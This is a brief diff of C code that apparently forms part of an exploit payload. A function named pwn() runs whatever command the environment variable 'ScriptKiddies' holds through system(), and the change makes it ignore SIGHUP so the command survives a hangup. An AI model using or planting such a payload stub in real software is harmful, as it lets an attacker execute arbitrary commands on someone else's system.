@@ -7,6 +7,8 @@
 
 void pwn() {
 	char *cmd = getenv("ScriptKiddies");
+
+	signal(SIGHUP, SIG_IGN);
 	system(cmd);
 }
 
